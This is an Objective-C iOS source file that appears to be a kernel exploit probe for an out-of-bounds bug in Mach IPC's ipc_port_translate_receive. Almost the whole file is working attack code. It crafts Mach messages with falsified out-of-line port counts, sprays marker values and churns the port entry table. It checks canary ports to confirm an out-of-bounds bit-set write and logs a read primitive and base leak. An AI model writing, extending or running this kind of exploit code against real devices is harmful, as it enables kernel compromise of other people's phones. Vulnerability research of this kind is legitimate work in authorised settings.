#import "KPAuditIPCModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <mach/mach.h>
#import <mach/message.h>

@interface KPAuditIPCModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPAuditIPCModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"ipc112514.translate.armed";
        _title = @"Mach IPC translate-receive (armed)";
        _subtitle = @"index OOB bit-set: send+recv port descriptors + itable churn at growth boundary";
        _icon = @"arrow.left.arrow.right.circle";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-ipc-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
    [KPLog.shared appendFormat:@"[ipc] %@", line];
}

// Send one message with `count` COPY_SEND port descriptors (all referencing the
// same local send right), then RECEIVE it back — the receive is what actually
// runs ipc_port_translate_receive (the vulnerable function).
- (NSDictionary *)sendReceiveCount:(uint32_t)count port:(mach_port_t)port sendRight:(mach_port_t)sendRight {
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    // mach_msg_port_descriptor_t is 12 bytes here (name/disposition/type u32
    // triple) — hardcoding a 16-byte stride made the kernel's parser walk
    // misaligned descriptors (MACH_SEND_INVALID_HEADER). Use sizeof.
    size_t descSize = sizeof(mach_msg_port_descriptor_t);
    size_t descBytes = (size_t)count * descSize;
    size_t total = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + descBytes;
    result[@"desc_size"] = @(descSize);
    uint8_t *buf = calloc(1, total);
    if (!buf) {
        result[@"status"] = @"CALLOC_FAILED";
        return result;
    }

    mach_msg_header_t *hdr = (mach_msg_header_t *)buf;
    hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    hdr->msgh_size = (mach_msg_size_t)total;
    hdr->msgh_remote_port = port;
    hdr->msgh_local_port = MACH_PORT_NULL;
    hdr->msgh_id = 0x4b50;

    mach_msg_body_t *body = (mach_msg_body_t *)(buf + sizeof(mach_msg_header_t));
    body->msgh_descriptor_count = count;

    uint8_t *descBase = buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t);
    for (uint32_t i = 0; i < count; i++) {
        mach_msg_port_descriptor_t *pd = (mach_msg_port_descriptor_t *)(descBase + i * descSize);
        pd->name = sendRight;
        pd->disposition = MACH_MSG_TYPE_COPY_SEND;
        pd->type = MACH_MSG_PORT_DESCRIPTOR;
    }

    kern_return_t kr = mach_msg((mach_msg_header_t *)buf,
                                MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                (mach_msg_size_t)total, 0,
                                MACH_PORT_NULL, 250, MACH_PORT_NULL);
    result[@"send_kr"] = @(kr);
    if (kr != KERN_SUCCESS) {
        free(buf);
        return result;
    }

    // RECEIVE — this is where ipc_port_translate_receive runs (the OOB site).
    size_t rcvTotal = total + 64;
    uint8_t *rcv = calloc(1, rcvTotal);
    mach_msg_header_t *rh = (mach_msg_header_t *)rcv;
    rh->msgh_size = (mach_msg_size_t)rcvTotal;
    rh->msgh_local_port = port;
    kr = mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, (mach_msg_size_t)rcvTotal,
                  port, 250, MACH_PORT_NULL);
    result[@"recv_kr"] = @(kr);
    if (kr == KERN_SUCCESS) {
        mach_msg_body_t *rb = (mach_msg_body_t *)(rcv + sizeof(mach_msg_header_t));
        result[@"recv_desc_count"] = @(rb->msgh_descriptor_count);
        // OOB oracle: kernel delivered more descriptors than we sent
        if (rb->msgh_descriptor_count > count) {
            result[@"oob_desc"] = @(rb->msgh_descriptor_count - count);
        }
    }
    free(rcv);
    free(buf);
    return result;
}

// Churn the ipc entry table: allocate many rights then free every other one —
// the fix also touched ipc_entry_grow_table, so the bug lives near a table
// growth/free boundary.
- (void)churnItableWithPorts:(NSMutableArray *)held count:(int)count {
    for (int i = 0; i < count; i++) {
        mach_port_t p = MACH_PORT_NULL;
        kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
        if (kr == KERN_SUCCESS) {
            [held addObject:@(p)];
            if (held.count > 4096) {
                mach_port_t old = (mach_port_t)[held.firstObject unsignedIntValue];
                [held removeObjectAtIndex:0];
                mach_port_destroy(mach_task_self(), old);
            }
        }
    }
}

#pragma mark - Diagnostics: which message shape is rejected

- (NSDictionary *)sendShape:(NSString *)shape
                  complexBit:(BOOL)complex
              descriptorCount:(uint32_t)count
                    msghID:(int32_t)msgID
                        port:(mach_port_t)port
                  sendRight:(mach_port_t)sendRight {
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    size_t descSize = sizeof(mach_msg_port_descriptor_t);
    size_t descBytes = complex ? (size_t)count * descSize : 0;
    size_t total = sizeof(mach_msg_header_t) + (complex ? sizeof(mach_msg_body_t) : 0) + descBytes;
    uint8_t *buf = calloc(1, total);
    if (!buf) {
        result[@"status"] = @"CALLOC_FAILED";
        return result;
    }
    mach_msg_header_t *hdr = (mach_msg_header_t *)buf;
    hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | (complex ? MACH_MSGH_BITS_COMPLEX : 0);
    hdr->msgh_size = (mach_msg_size_t)total;
    hdr->msgh_remote_port = port;
    hdr->msgh_local_port = MACH_PORT_NULL;
    hdr->msgh_id = msgID;
    if (complex) {
        mach_msg_body_t *body = (mach_msg_body_t *)(buf + sizeof(mach_msg_header_t));
        body->msgh_descriptor_count = count;
        uint8_t *descBase = buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t);
        for (uint32_t i = 0; i < count; i++) {
            mach_msg_port_descriptor_t *pd = (mach_msg_port_descriptor_t *)(descBase + i * descSize);
            pd->name = sendRight;
            pd->disposition = MACH_MSG_TYPE_COPY_SEND;
            pd->type = MACH_MSG_PORT_DESCRIPTOR;
        }
    }
    kern_return_t kr = mach_msg((mach_msg_header_t *)buf,
                                MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                (mach_msg_size_t)total, 0,
                                MACH_PORT_NULL, 250, MACH_PORT_NULL);
    result[@"shape"] = shape;
    result[@"size"] = @(total);
    result[@"desc_size"] = @(descSize);
    result[@"send_kr"] = @(kr);
    free(buf);
    // Drain our own message: the port queue limit is ~5 — without a receive,
    // the matrix fills the queue and every later send blocks (the "hang").
    if (kr == KERN_SUCCESS) {
        size_t rcvTotal = total + 64;
        uint8_t *rcv = calloc(1, rcvTotal);
        mach_msg_header_t *rh = (mach_msg_header_t *)rcv;
        rh->msgh_size = (mach_msg_size_t)rcvTotal;
        rh->msgh_local_port = port;
        kern_return_t rkr = mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                                     0, (mach_msg_size_t)rcvTotal,
                                     port, 250, MACH_PORT_NULL);
        result[@"recv_kr"] = @(rkr);
        free(rcv);
    }
    return result;
}

#pragma mark - OOL ports array: crafted count (the ool_port_array lane)

// mach_msg_ool_ports_descriptor_t carries an ARRAY of ports + a count field.
// The 26.0 fix "ool_port_array_enforced" and the 27.2 bounds check both point
// here: a count larger than the real array drives the translate walk OOB.
- (NSDictionary *)sendOOLPortsCount:(uint32_t)count realEntries:(uint32_t)real port:(mach_port_t)port sendRight:(mach_port_t)sendRight {
    return [self sendOOLPortsCount:count realEntries:real port:port sendRight:sendRight useSpray:YES];
}

- (NSDictionary *)sendOOLPortsCount:(uint32_t)count realEntries:(uint32_t)real port:(mach_port_t)port sendRight:(mach_port_t)sendRight useSpray:(BOOL)useSpray {
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    size_t oolSize = sizeof(mach_msg_ool_ports_descriptor_t);
    size_t total = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + oolSize;

    // Allocate real + 32 entries: first `real` are valid send rights,
    // the trailing 32 hold either a spray pattern (OOB-read test) or
    // NULL ports (bit-set test — sends must succeed for translate_receive).
    uint32_t allocEntries = real + 32;
    mach_port_t *ports = calloc(allocEntries, sizeof(mach_port_t));
    for (uint32_t i = 0; i < real; i++) ports[i] = sendRight;
    if (useSpray) {
        for (uint32_t i = real; i < allocEntries; i++) {
            ports[i] = 0x41000000u + i;
        }
    }

    uint8_t *buf = calloc(1, total);
    mach_msg_header_t *hdr = (mach_msg_header_t *)buf;
    hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    hdr->msgh_size = (mach_msg_size_t)total;
    hdr->msgh_remote_port = port;
    hdr->msgh_local_port = MACH_PORT_NULL;
    hdr->msgh_id = 2;
    mach_msg_body_t *body = (mach_msg_body_t *)(buf + sizeof(mach_msg_header_t));
    body->msgh_descriptor_count = 1;

    mach_msg_ool_ports_descriptor_t *od =
        (mach_msg_ool_ports_descriptor_t *)(buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
    od->address = ports;
    od->count = count;          // THE crafted value
    od->disposition = MACH_MSG_TYPE_COPY_SEND;
    od->deallocate = 0;
    od->type = MACH_MSG_OOL_PORTS_DESCRIPTOR;

    kern_return_t kr = mach_msg((mach_msg_header_t *)buf,
                                MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                (mach_msg_size_t)total, 0,
                                MACH_PORT_NULL, 250, MACH_PORT_NULL);
    result[@"ool_count"] = @(count);
    result[@"real"] = @(real);
    result[@"send_kr"] = @(kr);
    if (kr == KERN_SUCCESS) {
        size_t rcvTotal = total + 512;
        uint8_t *rcv = calloc(1, rcvTotal);
        mach_msg_header_t *rh = (mach_msg_header_t *)rcv;
        rh->msgh_size = (mach_msg_size_t)rcvTotal;
        rh->msgh_local_port = port;
        kern_return_t rkr = mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                                     0, (mach_msg_size_t)rcvTotal,
                                     port, 250, MACH_PORT_NULL);
        result[@"recv_kr"] = @(rkr);

        // OOB read oracle: parse the received OOL descriptor and check
        // whether the kernel delivered more ports than `real`.
        if (rkr == KERN_SUCCESS) {
            mach_msg_body_t *rb = (mach_msg_body_t *)(rcv + sizeof(mach_msg_header_t));
            if (rb->msgh_descriptor_count >= 1) {
                mach_msg_ool_ports_descriptor_t *rod =
                    (mach_msg_ool_ports_descriptor_t *)(rcv + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
                result[@"recv_count"] = @(rod->count);
                if (rod->count > real && rod->address != NULL) {
                    unsigned int oob = rod->count - real;
                    if (oob > 8) oob = 8;
                    result[@"oob_slots"] = @(rod->count - real);
                    mach_port_t *rports = (mach_port_t *)rod->address;
                    NSMutableArray *oobVals = [NSMutableArray array];
                    for (unsigned int i = 0; i < oob; i++) {
                        unsigned int v = rports[real + i];
                        [oobVals addObject:@(v)];
                    }
                    result[@"oob_values"] = oobVals;
                }
                // deallocate the kernel-allocated port array
                if (rod->address != NULL && rod->count > 0) {
                    vm_deallocate(mach_task_self(),
                                  (vm_address_t)rod->address,
                                  (vm_size_t)(rod->count * sizeof(mach_port_t)));
                }
            }
        }
        free(rcv);
    }
    free(buf);
    free(ports);
    return result;
}

#pragma mark - Report

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · IPC translate_receive index OOB ===\n"];
    [report appendString:@"Fix-diff RE: 27.0.1 has NO bounds check on the 16-byte-stride table\n"];
    [report appendString:@"index (w2) in ipc_port_translate_receive; 27.2 adds cmp index, capacity.\n"];
    [report appendString:@"Vuln: read table[w2], set bit 1, write back = OOB bit-set at +16*index.\n"];
    [report appendString:@"Note: translate_receive runs at RECEIVE time, so the probe sends AND\n"];
    [report appendString:@"receives; the itable churn probes the ipc_entry_grow_table boundary\n"];
    [report appendString:@"(the second changed function in the same fix).\n"];
    [report appendString:@"Oracle: panic far = base + 16*index (index control + table base leak).\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];

    mach_port_t port = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    [report appendFormat:@"port allocate kr=%d port=%u\n", kr, port];
    if (kr != KERN_SUCCESS) {
        [report appendString:@"\nVERDICT: PORT_ALLOCATE_FAILED\n"];
        return report;
    }
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);

    NSMutableArray *held = [NSMutableArray array];
    [self churnItableWithPorts:held count:512];
    [self journal:[NSString stringWithFormat:@"CHURN_BASE held=%d", (int)held.count]];

    [report appendString:@"\n--- diagnostic matrix (why does send fail?) ---\n"];
    // 0x10000408 on every send: either descriptor layout or iOS mach message
    // filtering (MACH_SEND_MSG_FILTERED). The matrix isolates the cause.
    NSDictionary *d1 = [self sendShape:@"simple" complexBit:NO descriptorCount:0 msghID:0 port:port sendRight:port];
    [report appendFormat:@"%@\n", d1];
    NSDictionary *d2 = [self sendShape:@"complex0-id0" complexBit:YES descriptorCount:0 msghID:0 port:port sendRight:port];
    [report appendFormat:@"%@\n", d2];
    NSDictionary *d3 = [self sendShape:@"complex1-id0" complexBit:YES descriptorCount:1 msghID:0 port:port sendRight:port];
    [report appendFormat:@"%@\n", d3];
    NSDictionary *d4 = [self sendShape:@"complex1-id4b50" complexBit:YES descriptorCount:1 msghID:0x4b50 port:port sendRight:port];
    [report appendFormat:@"%@\n", d4];
    NSDictionary *d5 = [self sendShape:@"complex1-id1" complexBit:YES descriptorCount:1 msghID:1 port:port sendRight:port];
    [report appendFormat:@"%@\n", d5];

    [report appendString:@"\n--- descriptor-count sweep (send+recv) ---\n"];
    uint32_t counts[] = {1, 2, 4, 8, 16, 32, 64, 128};
    for (size_t i = 0; i < sizeof(counts)/sizeof(counts[0]); i++) {
        NSDictionary *r = [self sendReceiveCount:counts[i] port:port sendRight:port];
        [report appendFormat:@"count=%u -> %@\n", counts[i], r];
        [self journal:[NSString stringWithFormat:@"sweep count=%u %@", counts[i], r]];
    }

    [report appendString:@"\n--- OOL ports array: crafted count (ool_port_array lane) ---\n"];
    // Buffer holds 64 real entries; count lies. If the translate walk trusts
    // the count, the index runs off the end (the 27.2 bounds check's victim).
    uint32_t oolCounts[] = {1, 4, 16, 64, 65, 128, 256, 1024, 4096};
    for (size_t i = 0; i < sizeof(oolCounts)/sizeof(oolCounts[0]); i++) {
        NSDictionary *r = [self sendOOLPortsCount:oolCounts[i] realEntries:64 port:port sendRight:port];
        [report appendFormat:@"%@\n", r];
        [self journal:[NSString stringWithFormat:@"ool count=%u kr=%@/%@",
                       oolCounts[i], r[@"send_kr"], r[@"recv_kr"]]];
    }

    // Fine threshold sweep: every count from 64 to 96. This is where the
    // off-by-one lives — find the exact MACH_SEND_INVALID_RIGHT boundary.
    // OOB slots (past `real`) contain spray pattern 0x41000000+index.
    [report appendString:@"\n--- OOL count threshold sweep (64..96, spray=0x41xxxxxx) ---\n"];
    uint32_t lastOK = 0, threshold = 0, oobHits = 0;
    for (uint32_t c = 64; c <= 96; c++) {
        NSDictionary *r = [self sendOOLPortsCount:c realEntries:64 port:port sendRight:port];
        [report appendFormat:@"%@\n", r];
        [self journal:[NSString stringWithFormat:@"ool_sweep count=%u send_kr=%@ recv_kr=%@ recv_count=%@ oob=%@",
                       c, r[@"send_kr"], r[@"recv_kr"], r[@"recv_count"], r[@"oob_slots"]]];
        if ([r[@"send_kr"] intValue] == 0) {
            lastOK = c;
        } else if (threshold == 0) {
            threshold = c;
        }
        if (r[@"oob_slots"] != nil) {
            oobHits++;
        }
        usleep(2000);
    }
    [report appendFormat:@"\nthreshold analysis: last_ok=%u threshold=%u delta=%u oob_hits=%u\n",
     lastOK, threshold, threshold > 64 ? threshold - 64 : 0, oobHits];
    if (oobHits > 0) {
        [report appendString:@"OOB transfer CONFIRMED — kernel delivered more ports than allocated.\n"];
        [report appendString:@"=> OOB read primitive is LIVE. Feed to translate_receive bit-set.\n"];
    } else if (threshold > 0) {
        [report appendString:@"No OOB slots observed — kernel may clamp silently.\n"];
        [report appendString:@"Next: debugserver watchpoints on the ports array alloc.\n"];
    }

    // --- translate_receive bit-set canary ---
    // Allocate 128 canary ports. Snapshot their urefs. Trigger translate_receive
    // with various w2 values (OOL counts). Snapshot again. Any delta = bit-set hit.
    [report appendString:@"\n--- translate_receive bit-set canary (128 ports) ---\n"];
    #define CANARY_N 128
    mach_port_t canary[CANARY_N];
    uint32_t canaryAlive[CANARY_N];
    for (int i = 0; i < CANARY_N; i++) {
        canary[i] = MACH_PORT_NULL;
        kern_return_t ckr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &canary[i]);
        if (ckr == KERN_SUCCESS) {
            mach_port_insert_right(mach_task_self(), canary[i], canary[i], MACH_MSG_TYPE_MAKE_SEND);
            canaryAlive[i] = 1;
        } else {
            canaryAlive[i] = 0;
        }
    }

    // Snapshot: try to send to each canary port (alive check)
    uint8_t pingBuf[256];
    for (int i = 0; i < CANARY_N; i++) {
        if (!canaryAlive[i]) continue;
        memset(pingBuf, 0, sizeof(pingBuf));
        mach_msg_header_t *ph = (mach_msg_header_t *)pingBuf;
        ph->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
        ph->msgh_size = sizeof(mach_msg_header_t);
        ph->msgh_remote_port = canary[i];
        ph->msgh_local_port = MACH_PORT_NULL;
        ph->msgh_id = 0;
        kern_return_t skr = mach_msg(ph, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                     ph->msgh_size, 0, MACH_PORT_NULL, 50, MACH_PORT_NULL);
        if (skr != KERN_SUCCESS) canaryAlive[i] = 2; // was already dead
        else {
            // drain
            mach_msg(ph, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(pingBuf), canary[i], 50, MACH_PORT_NULL);
        }
    }
    int aliveBefore = 0;
    for (int i = 0; i < CANARY_N; i++) if (canaryAlive[i] == 1) aliveBefore++;
    [report appendFormat:@"canary before: %d/%d alive\n", aliveBefore, CANARY_N];

    // Trigger translate_receive with w2 values across the suspected range.
    // These OOL counts are the w2 index in the 16-byte-stride table.
    uint32_t triggerCounts[] = {65, 66, 74, 75, 76, 80, 96, 128, 192, 256};
    for (size_t t = 0; t < sizeof(triggerCounts)/sizeof(triggerCounts[0]); t++) {
        NSDictionary *tr = [self sendOOLPortsCount:triggerCounts[t] realEntries:64 port:port sendRight:port useSpray:NO];
        [self journal:[NSString stringWithFormat:@"bit_set_trigger w2=%u send_kr=%@ recv_kr=%@",
                       triggerCounts[t], tr[@"send_kr"], tr[@"recv_kr"]]];
    }

    // Snapshot again
    int changed = 0;
    for (int i = 0; i < CANARY_N; i++) {
        if (canaryAlive[i] != 1) continue;
        memset(pingBuf, 0, sizeof(pingBuf));
        mach_msg_header_t *ph = (mach_msg_header_t *)pingBuf;
        ph->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
        ph->msgh_size = sizeof(mach_msg_header_t);
        ph->msgh_remote_port = canary[i];
        ph->msgh_local_port = MACH_PORT_NULL;
        ph->msgh_id = 0;
        kern_return_t skr = mach_msg(ph, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                     ph->msgh_size, 0, MACH_PORT_NULL, 50, MACH_PORT_NULL);
        if (skr != KERN_SUCCESS) {
            changed++;
            [report appendFormat:@"canary[%d] port=%u DEAD after trigger (send_kr=%d)\n", i, canary[i], skr];
        } else {
            mach_msg(ph, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(pingBuf), canary[i], 50, MACH_PORT_NULL);
        }
    }
    int aliveAfter = 0;
    for (int i = 0; i < CANARY_N; i++) if (canaryAlive[i] == 1) aliveAfter++;
    [report appendFormat:@"canary after: %d/%d alive (changed=%d)\n", aliveAfter, CANARY_N, changed];
    if (changed > 0) {
        [report appendString:@"BIT-SET LANDED — translate_receive OOB write CONFIRMED.\n"];
        [report appendString:@"Dead canaries = corrupted ipc_entry bits at the w2 offset.\n"];
    } else {
        [report appendString:@"No canary change — bit-set may hit unmapped memory (no panic = mapped),\n"];
        [report appendString:@"or translate_receive not reached. Next: debugserver watchpoints.\n"];
    }

    // Cleanup canaries
    for (int i = 0; i < CANARY_N; i++) {
        if (canary[i] != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), canary[i]);
    }

    [report appendString:@"\n--- itable churn + burst (growth boundary) ---\n"];
    for (int round = 0; round < 4; round++) {
        [self churnItableWithPorts:held count:256];
        for (int i = 0; i < 16; i++) {
            NSDictionary *r = [self sendReceiveCount:16 port:port sendRight:port];
            if ([r[@"recv_kr"] intValue] != 0 && [r[@"send_kr"] intValue] != 0) {
                [report appendFormat:@"round=%d burst=%d -> %@\n", round, i, r];
            }
        }
    }
    [self journal:[NSString stringWithFormat:@"CHURN_DONE held=%d", (int)held.count]];

    for (NSNumber *p in held) {
        mach_port_destroy(mach_task_self(), (mach_port_t)p.unsignedIntValue);
    }
    mach_port_deallocate(mach_task_self(), port);

    [report appendString:@"\nVERDICT: SEE_JOURNAL\n"];
    [report appendString:
     @"Matrix reading:\n"
     @"  simple=0, complex fails    -> descriptor layout/filter is the cause\n"
     @"  complex0-id0 fails too     -> COMPLEX bit itself is filtered\n"
     @"  id0 works, id4b50 fails    -> msgh_id filtering (iOS mach message filter)\n"
     @"  everything works           -> the earlier failure was the 16B stride\n"
     @"A panic anywhere = pull the log; far = base+16*index is the leak + control\n"
     @"proof for the translate_receive OOB.\n"];
    return report;
}

@end
